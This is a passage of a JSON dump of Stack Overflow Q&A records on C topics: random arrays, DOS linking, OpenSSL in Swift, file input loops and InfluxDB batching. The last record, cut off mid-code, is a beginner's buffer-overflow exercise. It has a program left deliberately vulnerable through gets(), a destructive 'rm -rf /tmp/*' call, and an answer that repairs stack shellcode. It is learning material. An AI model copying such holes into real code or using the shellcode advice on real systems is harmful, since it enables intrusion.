rel=\"nofollow noreferrer\">https://linux.die.net/man/3/srand</a></p>\n"}], "owner": {"reputation": 25, "user_id": 5273734, "user_type": "registered", "profile_image": "https://graph.facebook.com/1065607453451776/picture?type=large", "display_name": "Muhammad Shaeel Abbas", "link": "https://stackoverflow.com/users/5273734/muhammad-shaeel-abbas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "accepted_answer_id": 50026030, "answer_count": 1, "score": -1, "last_activity_date": 1524669929, "creation_date": 1524668439, "last_edit_date": 1524669587, "question_id": 50025517, "link": "https://stackoverflow.com/questions/50025517/array-not-being-randomized-as-it-should-and-values-coming-in-negative", "title": "Array not being randomized as it should and values coming in negative", "body": "<p>I'm trying to store random numbers using the <code>srand</code> function to store values in a 2D Array using a loop. When I print out the array it has the same values everytime and the numbers are often in negative values which is strange and also they remain the same even if <code>srand</code> function is there.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include &lt;time.h&gt;\n\n#define NROW 13\n#define NCOL 11\n\nint main()\n{\n    void disp_array(int a[NROW][NCOL]);\n\n    int ar[NROW][NCOL];\n    int i, j;\n\n    for (i = 0; i &lt; NROW; i++) {\n        for (j = 0; j &lt; NCOL; j++) {\n            ar[NROW][NCOL] = (rand() % 101);\n        }\n    }\n    disp_array(ar);\n\n    return 0;\n}\n\nvoid disp_array(int a[NROW][NCOL])\n{\n    int i;\n    int j;\n\n    for (i = 0; i &lt; 7; i++) {\n        for (j = 0; j &lt; 5; j++) {\n            printf(\"Value at row %d column %d is %d \\n\", i, j, a[i][j]);\n        }\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "assembly", "linker", "dos", "real-mode"], "comments": [{"owner": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 2, "creation_date": 1524667686, "post_id": 50025223, "comment_id": 87066544, "body": "You don&#39;t want <code>-f bin</code>. You want whatever object file format you use. Probably <code>-f coff</code>. See <code>nasm -hf</code>."}, {"owner": {"reputation": 1162, "user_id": 1036018, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/kc7Yd.jpg?s=128&g=1", "display_name": "ddacot", "link": "https://stackoverflow.com/users/1036018/ddacot"}, "reply_to_user": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "edited": false, "score": 0, "creation_date": 1524683018, "post_id": 50025223, "comment_id": 87075330, "body": "@Jester I used -fcoff and I am getting &quot;coff format does not support non-32 bit relocations.&quot;"}, {"owner": {"reputation": 35113, "user_id": 3826372, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P0peM.png?s=128&g=1", "display_name": "Ross Ridge", "link": "https://stackoverflow.com/users/3826372/ross-ridge"}, "edited": false, "score": 0, "creation_date": 1524705952, "post_id": 50025223, "comment_id": 87083111, "body": "djgpp generates 32-bit code which can&#39;t be linked to 16-bit code in the way you&#39;re expecting.  The code it generates normally requires DOS and so will the Allegro library. My suggestion is just to use FreeDOS as your &quot;bootloader&quot; and put the command to start your program in the AUTOEXEC.BAT file."}], "answers": [{"tags": [], "owner": {"reputation": 63648, "user_id": 97248, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/d891ba8bd448f11617333f8642870262?s=128&d=identicon&r=PG", "display_name": "pts", "link": "https://stackoverflow.com/users/97248/pts"}, "is_accepted": true, "score": 1, "last_activity_date": 1594451840, "creation_date": 1594451840, "answer_id": 62846271, "question_id": 50025223, "link": "https://stackoverflow.com/questions/50025223/how-do-i-link-an-object-file-generated-from-c-code-a-static-library-and-a-nasm/62846271#62846271", "title": "How do I link an object file generated from C code, a static library and a NASM generated object file?", "body": "<p>The .o file generated by DJGPP contains 32-bit (i386) code, which cannot be called from 16-bit code directly.</p>\n<p>Under DOS, 32-bit code is typically run by using a <a href=\"https://en.wikipedia.org/wiki/DOS_extender\" rel=\"nofollow noreferrer\">DOS extender</a>, which switches to 32-bit protected mode, sets up memory mappings and DOS API translation (i.e. small trampoline functions which switch back to 16-bit real mode when calling the int 21h DOS API). and then loads and calls the 32-bit code.</p>\n<p>Lightweight alternatives of DOS extenders for switching between 16-bit and 32-bit mode:</p>\n<ul>\n<li><p><a href=\"https://en.wikipedia.org/wiki/Unreal_mode\" rel=\"nofollow noreferrer\">unreal mode</a> with <em>gcc -m16</em> (<code>.code16gcc</code>). See <a href=\"https://stackoverflow.com/a/33022889/\">this answer</a> and other answers more details about <em>gcc -m16</em>.</p>\n</li>\n<li><p>The bootloader of the <a href=\"http://syslinux.org/\" rel=\"nofollow noreferrer\">Syslinux</a> project, which contains 16-bit assembly (NASM), 32-bit assembly (NASM) and 32-bit C (GCC) code, and it switches between them.</p>\n</li>\n</ul>\n<p>To link 16-bit and 32-bit code together, you can run <code>objcopy -O binary func.o func.bin</code> (32-bit), and then add <code>%incbin &quot;func.bin&quot;</code> to your 16-bit NASM source file. However, this breaks relocations (so you won't be able to use global variables).</p>\n"}], "owner": {"reputation": 1162, "user_id": 1036018, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/kc7Yd.jpg?s=128&g=1", "display_name": "ddacot", "link": "https://stackoverflow.com/users/1036018/ddacot"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 520, "favorite_count": 1, "accepted_answer_id": 62846271, "answer_count": 1, "score": 1, "last_activity_date": 1594451840, "creation_date": 1524667570, "question_id": 50025223, "link": "https://stackoverflow.com/questions/50025223/how-do-i-link-an-object-file-generated-from-c-code-a-static-library-and-a-nasm", "title": "How do I link an object file generated from C code, a static library and a NASM generated object file?", "body": "<p>I am working on a program (for real real mode) that is loaded by a bootloader to an address in memory and jumps to it and starts executing the program. The problem is that I have the project separated into two files: <em>a.asm</em> (16bit asm, NASM syntax) and <em>b.c</em> (which i compile with gcc for dos (djgpp)). Also, <em>b.c</em> uses some functions from the allegro library (I have it as a static library, .a). </p>\n\n<p>My question is, how do I compile and link these 3 files together? My first thought was to:</p>\n\n<ol>\n<li>Compile and assemble b.c with gcc (with the -c flag), as a result I get a <em>b.o</em> file</li>\n<li>Assemble <em>a.asm</em> with NASM (-fbin or.. ?) and get <em>a.o</em> </li>\n<li>Link <em>b.o</em>, <em>a.o</em> and <em>allegro.a</em> to get a pure binary (no .exe headers,\nno debug information etc.)</li>\n</ol>\n\n<p>I tried the above approach, but at the step 3, the linker throws an error saying that the format of <em>a.o</em> (the object file generated by NASM), is unrecognized, and that may be because either I am not invoking the right flags and options when assembling the file, or.. </p>\n\n<p>I would like some guidance on how to approach this problem.</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["c", "swift", "openssl", "cryptography", "stack"], "answers": [{"tags": [], "owner": {"reputation": 1323, "user_id": 6900902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/96a5448d619d9cd1bd6341a384301587?s=128&d=identicon&r=PG&f=1", "display_name": "bscothern", "link": "https://stackoverflow.com/users/6900902/bscothern"}, "is_accepted": false, "score": 0, "last_activity_date": 1524842294, "creation_date": 1524842294, "answer_id": 50065508, "question_id": 50025139, "link": "https://stackoverflow.com/questions/50025139/work-with-openssl-stack-st-x509-in-swift/50065508#50065508", "title": "Work with OpenSSL stack_st_x509 in Swift?", "body": "<p>If macros are the only way to access the data you cannot do so from swift. You must write C or Objective-C code that gets the data out that you are interested in.</p>\n\n<p>You can then call these wrapper functions from swift to get your data.</p>\n"}], "owner": {"reputation": 8952, "user_id": 331747, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/08d311db9b4893455102265ceed010b2?s=128&d=identicon&r=PG", "display_name": "Shadowman", "link": "https://stackoverflow.com/users/331747/shadowman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 248, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1524842294, "creation_date": 1524667323, "question_id": 50025139, "link": "https://stackoverflow.com/questions/50025139/work-with-openssl-stack-st-x509-in-swift", "title": "Work with OpenSSL stack_st_x509 in Swift?", "body": "<p>I've finally managed to get code working to validate a CMS signature in Swift using OpenSSL's <code>CMS_Verify</code> method.  Now I would like to use the <code>STACK_OF(X509) *CMS_get0_signers(CMS_ContentInfo *cms)</code> method to get the certificates used to sign the message.  In Swift, the data type for that call would be <code>UnsafeMutablePointer&lt;stack_st_X509&gt;</code>.  I'm able to get a value back for that call, so I know it's succeeding.  What I don't know, is how to extract the contents of it?</p>\n\n<p>I was reading the <a href=\"https://wiki.openssl.org/index.php/STACK_API\" rel=\"nofollow noreferrer\">STACK API docs</a> and it appears that access to the contents of an OpenSSL stack value is accomplished using a bunch of macros in the OpenSSL code.  These macros are not carried over in Swift, however.  </p>\n\n<p>Does anyone know how I can go about accessing the <code>stack_st_x509</code> data in Swift?  I'm not terribly familiar with the OpenSSL APIs so I'm somewhat stuck.</p>\n"}, {"tags": ["c", "arrays", "file", "loops"], "comments": [{"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 0, "creation_date": 1524667106, "post_id": 50024996, "comment_id": 87066138, "body": "<code>for(i&gt;0;i&lt;=11;i++){</code>  --&gt; <code>for (i = 0; i &lt;= 11; i++){</code> Also, <code>l</code> is not initialized. You probably want to use <code>i</code> and not <code>l</code>."}, {"owner": {"reputation": 9, "user_id": 9595867, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3adffe0e00fac75d6066142e5b44236c?s=128&d=identicon&r=PG&f=1", "display_name": "point5", "link": "https://stackoverflow.com/users/9595867/point5"}, "reply_to_user": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 0, "creation_date": 1524667281, "post_id": 50024996, "comment_id": 87066249, "body": "Ive made these changes and it does the same thing"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1524671675, "post_id": 50024996, "comment_id": 87069373, "body": "If you print the index (<code>l</code>, but I am with Johnny, you probably want <code>i</code>)  along with the Q&amp;A, what does it say?"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1524671756, "post_id": 50024996, "comment_id": 87069422, "body": "Could you upgrade to a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>? Some of the possible errors do not survive making one."}], "owner": {"reputation": 9, "user_id": 9595867, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3adffe0e00fac75d6066142e5b44236c?s=128&d=identicon&r=PG&f=1", "display_name": "point5", "link": "https://stackoverflow.com/users/9595867/point5"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 21, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1524666916, "creation_date": 1524666916, "question_id": 50024996, "link": "https://stackoverflow.com/questions/50024996/reading-from-a-file-into-an-array-and-storing-the-answer-in-another", "title": "Reading from a file into an array and storing the answer in another", "body": "<p>The below script is reading questions from a file and looping round and asking them to the user, i want the users answer to be stored in the array q.a and then at the end of the programme bot the questions ans the answers shown. All that happens at the minute is the last question asked and the last answer given is displayed 11 times. Can someone please help?</p>\n\n<pre><code>  struct qa{\n  char q[40][250];\n  char a[40][250];\n  };\n\n int main()\n {\n   int a, i, k, l, j;\n\n   FILE *fp;\n   fp = fopen(\"quest.txt\", \"r\");\n   if (fp == NULL){\n        printf(\"nope nothing in there\\n\");\n   }\n\n   struct qa q;\n\n      for(i&gt;0;i&lt;=11;i++){\n      fgets(q.q[l], 250, (FILE*)fp);\n      printf(\"%s\", q.q[l]);\n      scanf(\"%s\", q.a[l]);\n      }\n\n      for (i = 0; i &lt; 11; i++){    \n        printf(\"%s\\n %s\\n\", q.a[l], q.q[l]);\n      }\n}\n</code></pre>\n"}, {"tags": ["c", "newline", "libcurl", "influxdb", "batching"], "comments": [{"owner": {"reputation": 1292, "user_id": 6219718, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-MEDMt70D6i4/AAAAAAAAAAI/AAAAAAAAASM/MoQBXDayncg/photo.jpg?sz=128", "display_name": "Yuri Lachin", "link": "https://stackoverflow.com/users/6219718/yuri-lachin"}, "edited": false, "score": 1, "creation_date": 1524668660, "post_id": 50024857, "comment_id": 87067255, "body": "Looks like you don&#39;t use batching of data points at all: one point - 1 http post. Try posting data in batches of 1000-10000 points per post."}, {"owner": {"reputation": 849, "user_id": 3895131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/22f08f679eb1a0209d4bdc53b6ff5636?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar", "link": "https://stackoverflow.com/users/3895131/oscar"}, "reply_to_user": {"reputation": 1292, "user_id": 6219718, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-MEDMt70D6i4/AAAAAAAAAAI/AAAAAAAAASM/MoQBXDayncg/photo.jpg?sz=128", "display_name": "Yuri Lachin", "link": "https://stackoverflow.com/users/6219718/yuri-lachin"}, "edited": false, "score": 0, "creation_date": 1524668898, "post_id": 50024857, "comment_id": 87067438, "body": "Can you provide me a simple example ? I was thinking that the \\n character will batch two points and multiply my performances, regarding to the line protocol, but perhaps I missed something..."}, {"owner": {"reputation": 1292, "user_id": 6219718, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-MEDMt70D6i4/AAAAAAAAAAI/AAAAAAAAASM/MoQBXDayncg/photo.jpg?sz=128", "display_name": "Yuri Lachin", "link": "https://stackoverflow.com/users/6219718/yuri-lachin"}, "edited": false, "score": 0, "creation_date": 1524670878, "post_id": 50024857, "comment_id": 87068852, "body": "I&#39;m sorry - didn&#39;t notice \\n. Still batch size has to be large enough to become noticable. You&#39;ll have to experiment to find optimum. Also looks strange that you have value0-value9 fields in first record and value10-value19 in the second. Typically field names are the same for all datapoints. Is it intended? And it is better to put explicit and different timestamps  for each line, otherewise there is a change influxdb will treat all lines as having the same timestamp."}, {"owner": {"reputation": 849, "user_id": 3895131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/22f08f679eb1a0209d4bdc53b6ff5636?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar", "link": "https://stackoverflow.com/users/3895131/oscar"}, "reply_to_user": {"reputation": 1292, "user_id": 6219718, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-MEDMt70D6i4/AAAAAAAAAAI/AAAAAAAAASM/MoQBXDayncg/photo.jpg?sz=128", "display_name": "Yuri Lachin", "link": "https://stackoverflow.com/users/6219718/yuri-lachin"}, "edited": false, "score": 0, "creation_date": 1524699401, "post_id": 50024857, "comment_id": 87081617, "body": "Thank you for your answer, I will try with more data points (just copy/past the first one will do the job right ?). Yep, it&#39;s an error from my perception of &quot;batching&quot;, now I have a better comprehension than when I wrote this code. I am not understanding why I have to put explitely the timestamp of every points, if I d&#39;like to use the server&#39;s timestamp ? Actually I am benchmarking influxdb with some anonymized data, the production data will looks close but not exactly the same and I don&#39;t know yet if I they are timestamped or not, so I presume that the timestamp given by the server is great."}, {"owner": {"reputation": 1292, "user_id": 6219718, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-MEDMt70D6i4/AAAAAAAAAAI/AAAAAAAAASM/MoQBXDayncg/photo.jpg?sz=128", "display_name": "Yuri Lachin", "link": "https://stackoverflow.com/users/6219718/yuri-lachin"}, "edited": false, "score": 0, "creation_date": 1524728626, "post_id": 50024857, "comment_id": 87091011, "body": "Regarding timestamping: you are not using any tags in your data. So influxdb will treat all data points as one time serie and several points having identical timestamp will be considered as ONE datapoint actually and overwrite each other - only one point will be kept in db. Also don&#39;t forget that influx expects nanosecond ts precision by default. Review InfluxDB main concepts for better undestanding."}], "answers": [{"comments": [{"owner": {"reputation": 849, "user_id": 3895131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/22f08f679eb1a0209d4bdc53b6ff5636?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar", "link": "https://stackoverflow.com/users/3895131/oscar"}, "edited": false, "score": 0, "creation_date": 1524995793, "post_id": 50059218, "comment_id": 87186343, "body": "It works pretty well, now I have 115k points/seconds with 1k batching per http request"}], "tags": [], "owner": {"reputation": 1292, "user_id": 6219718, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-MEDMt70D6i4/AAAAAAAAAAI/AAAAAAAAASM/MoQBXDayncg/photo.jpg?sz=128", "display_name": "Yuri Lachin", "link": "https://stackoverflow.com/users/6219718/yuri-lachin"}, "is_accepted": true, "score": 1, "last_activity_date": 1524820872, "creation_date": 1524820872, "answer_id": 50059218, "question_id": 50024857, "link": "https://stackoverflow.com/questions/50024857/improve-points-per-seconds-writing-with-influxdb/50059218#50059218", "title": "Improve points per seconds writing with InfluxDB", "body": "<p>Try posting data in batches of 1000-10000 points per post.\nBatch size has to be large enough to become noticable. You'll have to experiment to find optimum.</p>\n\n<p>And it is better to put explicit and different timestamps for each line, otherwise influxdb will treat all lines as having the same timestamp. In your case multiple points having identical timestamp will be considered as ONE datapoint actually and overwrite each other - only one point will be kept in db.</p>\n"}], "owner": {"reputation": 849, "user_id": 3895131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/22f08f679eb1a0209d4bdc53b6ff5636?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar", "link": "https://stackoverflow.com/users/3895131/oscar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 463, "favorite_count": 0, "accepted_answer_id": 50059218, "answer_count": 1, "score": 0, "last_activity_date": 1524820872, "creation_date": 1524666521, "last_edit_date": 1524761997, "question_id": 50024857, "link": "https://stackoverflow.com/questions/50024857/improve-points-per-seconds-writing-with-influxdb", "title": "Improve points per seconds writing with InfluxDB", "body": "<p>I am trying to improve writing performance between a C client program and a single node of <a href=\"https://en.wikipedia.org/wiki/InfluxDB\" rel=\"nofollow noreferrer\">InfluxDB</a>.</p>\n\n<p>Currently my record is 2.526K writes per seconds, as seen in the screenshot below:</p>\n\n<p><a href=\"https://i.stack.imgur.com/GszRH.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/GszRH.png\" alt=\"\"></a></p>\n\n<p>My C program is basically an infinite loop that produces HTTP POST requests with the use of <a href=\"https://curl.haxx.se/libcurl/\" rel=\"nofollow noreferrer\">libcurl</a>.</p>\n\n<p>Here is the code responsible for the POST requests:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>int configure_curl_easy_operation(CURL *curl_easy_handler)\n{\n  // using this doc page https://curl.haxx.se/libcurl/c/curl_easy_setopt.html\n  // behavior options\n  curl_easy_setopt(curl_easy_handler, CURLOPT_VERBOSE, 1L);\n\n  // callback options\n\n  // error options\n\n  // network options\n  //curl_easy_setopt(curl_easy_handler, CURLOPT_URL, \"http://localhost:8086/ping\"); an old test\n  curl_easy_setopt(curl_easy_handler, CURLOPT_URL, \"http://localhost:8086/write?db=XXX_metrics\");\n  curl_easy_setopt(curl_easy_handler, CURLOPT_HTTP_CONTENT_DECODING, 0L);\n  curl_easy_setopt(curl_easy_handler, CURLOPT_TRANSFER_ENCODING, 0L);\n  //curl_easy_setopt(curl_easy_handler, CURLOPT_HTTPHEADER, )// work here\n  curl_easy_setopt(curl_easy_handler, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);\n  curl_easy_setopt(curl_easy_handler, CURLOPT_POST, 1L);\n  curl_easy_setopt(curl_easy_handler, CURLOPT_REDIR_PROTOCOLS, 0L);\n  curl_easy_setopt(curl_easy_handler, CURLOPT_DEFAULT_PROTOCOL, \"http\");\n  curl_easy_setopt(curl_easy_handler, CURLOPT_FOLLOWLOCATION, 0L);\n  //curl_easy_setopt(curl_easy_handler, CURLOPT_HTTPHEADER, NULL);\n\n  // NAMES and PASSWORDS OPTIONS\n\n  // HTTP OPTIONS\n  // curl_easy_setopt(curl_easy_handler, CURLOPT_HTTPGET, 0L);\n\n  // SMTP OPTIONS\n\n  // TFTP OPTIONS\n\n  // FTP OPTIONS\n\n  // RTSP OPTIONS\n\n  // PROTOCOL OPTIONS\n\n  if (curl_easy_setopt(curl_easy_handler, CURLOPT_POSTFIELDS, \"metrics value0=0,value1=872323,value2=928323,value3=238233,value4=3982332,value5=209233,value6=8732632,value7=4342421,value8=091092744,value9=230944\\nmetrics value10=0,value11=872323,value12=928323,value13=238233,value14=3982332,value15=209233,value16=8732632,value17=4342421,value18=091092744,value19=230944\") != CURLE_OK)\n    return (1);\n  //curl_easy_setopt(curl_easy_handler, CURLOPT_MIMEPOST, mime);\n\n  // CONNECTION OPTIONS\n\n  // SSL and SECURITY OPTIONS\n\n  // SSH OPTIONS\n\n  // OTHER OPTIONS\n\n  // TELNET OPTIONS\n  return (0);\n}\n</code></pre>\n\n\n\n<pre class=\"lang-c prettyprint-override\"><code>int do_things(t_contexts_handlers *ctxts_handlers)\n{\n  while (g_running)\n    {\n      if ((configure_curl_easy_operation(ctxts_handlers-&gt;curl.curl_easy_handler)) != 0)\n    {\n      fprintf(stderr, \"Stop running after an error occured before making a curl operation\\n\");\n      g_running = 0;\n      continue;\n    }\n      if (curl_easy_perform(ctxts_handlers-&gt;curl.curl_easy_handler) != CURLE_OK)\n    fprintf(stderr, \"an error occured\\n\");\n    }\n  return (0);\n}\n</code></pre>\n\n\n\n<ol>\n<li>I don't use threads (so far)</li>\n<li>I use the easy API (so far)</li>\n<li>I've changed some configuration settings (but they didn't improve performance):</li>\n</ol>\n\n\n\n<pre><code>access-log-path : \"/dev/null\" \npprof-enabled : false \nunix-socket-enabled : false \n[ifql] enabled : false \n[subscriber] enabled : false\n</code></pre>\n\n\n\n<p>Do you have some ideas to improve performance? </p>\n\n<p>EDIT: As you can see, the first screenshot is not the one corresponding to the C code above. Here is the correct one:</p>\n\n<p><a href=\"https://i.stack.imgur.com/5883y.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/5883y.png\" alt=\"\"></a></p>\n"}, {"tags": ["c", "gdb", "stack-overflow", "buffer-overflow", "exploit"], "comments": [{"owner": {"reputation": 338, "user_id": 7245311, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/A1AsA.png?s=128&g=1", "display_name": "poming", "link": "https://stackoverflow.com/users/7245311/poming"}, "edited": false, "score": 0, "creation_date": 1524673257, "post_id": 50024833, "comment_id": 87070262, "body": "I guess <code>rip</code> was actually overwriten by <code>0x7fffffffe18f</code> correctly, and the instructions (shellcode) kept executing until <code>0x7fffffffe1c0</code>, it is usually your shellcode failed to get a shell. You can try to set a break point before entering shellcode and step into to figure out what&#39;s wrong."}, {"owner": {"reputation": 149, "user_id": 8005140, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/49cuk.jpg?s=128&g=1", "display_name": "Nim", "link": "https://stackoverflow.com/users/8005140/nim"}, "reply_to_user": {"reputation": 338, "user_id": 7245311, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/A1AsA.png?s=128&g=1", "display_name": "poming", "link": "https://stackoverflow.com/users/7245311/poming"}, "edited": false, "score": 0, "creation_date": 1524694980, "post_id": 50024833, "comment_id": 87080379, "body": "Thank you for your reply! Ooooh, I haven&#39;t thought about that... Well... I tried setting a break point to <code>0x7fffffffe18f</code> (the return address I choosed) and it does nothing, acts like the breakpoint doesn&#39;t exist, same when I try to break <code>0x7fffffffe190</code>, or any following address, the program ends with SIGBUS when I start it..."}, {"owner": {"reputation": 338, "user_id": 7245311, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/A1AsA.png?s=128&g=1", "display_name": "poming", "link": "https://stackoverflow.com/users/7245311/poming"}, "edited": false, "score": 0, "creation_date": 1524726884, "post_id": 50024833, "comment_id": 87089954, "body": "try to set a break point <b>before</b> entering shellcode? like main <code>ret</code> or somewhere, don&#39;t put break point at stack."}], "answers": [{"comments": [{"owner": {"reputation": 244, "user_id": 2967945, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XpQyf.png?s=128&g=1", "display_name": "sudhackar", "link": "https://stackoverflow.com/users/2967945/sudhackar"}, "edited": false, "score": 0, "creation_date": 1524743479, "post_id": 50035458, "comment_id": 87100375, "body": "This is actually fairly common when people copy and use shellcodes without looking into what it needs or what side effects it has."}, {"owner": {"reputation": 149, "user_id": 8005140, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/49cuk.jpg?s=128&g=1", "display_name": "Nim", "link": "https://stackoverflow.com/users/8005140/nim"}, "edited": false, "score": 0, "creation_date": 1524746934, "post_id": 50035458, "comment_id": 87102803, "body": "@EmployedRussian  Thank you! It seems like it&#39;s working! <a href=\"https://pastebin.com/AvXpyJrv\" rel=\"nofollow noreferrer\">pastebin.com/AvXpyJrv</a>. Tho it doesn&#39;t work when I pipe the input directly into the program without gdb, but apparently the address space is different between real and gdb executions, so I&#39;ll look more into that..."}, {"owner": {"reputation": 149, "user_id": 8005140, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/49cuk.jpg?s=128&g=1", "display_name": "Nim", "link": "https://stackoverflow.com/users/8005140/nim"}, "reply_to_user": {"reputation": 244, "user_id": 2967945, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XpQyf.png?s=128&g=1", "display_name": "sudhackar", "link": "https://stackoverflow.com/users/2967945/sudhackar"}, "edited": false, "score": 0, "creation_date": 1524747043, "post_id": 50035458, "comment_id": 87102890, "body": "@sudhackar I know, I shouldn&#39;t just copy and paste like that, I&#39;m just very new to low level exploitation, assembly, etc, I&#39;ll continue to learn about it"}, {"owner": {"reputation": 149, "user_id": 8005140, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/49cuk.jpg?s=128&g=1", "display_name": "Nim", "link": "https://stackoverflow.com/users/8005140/nim"}, "edited": false, "score": 0, "creation_date": 1524748064, "post_id": 50035458, "comment_id": 87103738, "body": "@EmployedRussian Followed this and it works like a charm: <a href=\"https://reverseengineering.stackexchange.com/questions/2983/how-to-predict-address-space-layout-differences-between-real-and-gdb-controlled\" title=\"how to predict address space layout differences between real and gdb controlled\">reverseengineering.stackexchange.com/questions/2983/&hellip;</a> . Thanks again for your help!"}], "tags": [], "owner": {"reputation": 162629, "user_id": 50617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YFykQ.png?s=128&g=1", "display_name": "Employed Russian", "link": "https://stackoverflow.com/users/50617/employed-russian"}, "is_accepted": true, "score": 2, "last_activity_date": 1524720626, "creation_date": 1524720626, "answer_id": 50035458, "question_id": 50024833, "link": "https://stackoverflow.com/questions/50024833/linux-buffer-overflow-of-simple-c-program-is-giving-sigbus/50035458#50035458", "title": "Linux: Buffer overflow of simple C program is giving SIGBUS", "body": "<p>The problem is:</p>\n\n<ol>\n<li>You put executable code on the stack,</li>\n<li>You call <code>puts</code>, which overwrites stack,</li>\n<li>You return to the (now corrupted) code on the stack.</li>\n</ol>\n\n<p>When I comment out all the code after <code>gets</code> (actually just return immediately after it), then the shell code remains intact... only to get corrupted by <em>itself</em> when it executes <code>push</code>es -- it's very confusing because your <code>$rsp</code> and <code>$rip</code> are pointing to the same place.</p>\n\n<p>Adding <code>sub $40,$rsp</code> (bytes: <code>\\x48\\x83\\xec\\x40</code>) to the start of shellcode solves that problem.</p>\n"}], "owner": {"reputation": 149, "user_id": 8005140, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/49cuk.jpg?s=128&g=1", "display_name": "Nim", "link": "https://stackoverflow.com/users/8005140/nim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 469, "favorite_count": 0, "accepted_answer_id": 50035458, "answer_count": 1, "score": 1, "last_activity_date": 1524720626, "creation_date": 1524666457, "question_id": 50024833, "link": "https://stackoverflow.com/questions/50024833/linux-buffer-overflow-of-simple-c-program-is-giving-sigbus", "title": "Linux: Buffer overflow of simple C program is giving SIGBUS", "body": "<p>I am a beginner in binary exploitation, and I'm training for the exploitation of buffer overflows. I made a useless short C program:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void) {\n    setbuf(stdout, NULL);\n    char buffer[64];\n    puts(\"\\nWELCOME TO THE REMOTE TEMP CLEANER SERVICE\\n\");\n    printf(\"Please enter a password: \");\n    gets(buffer);\n    puts(\"\\n\");\n    if(strcmp(buffer, \"securepassword1234\") == 0) {\n        puts(\"[+] Password correct.\");\n        puts(\"[*] Cleaning temp folder..\");\n        system(\"/bin/rm -rf /tmp/*\");\n        puts(\"[+] 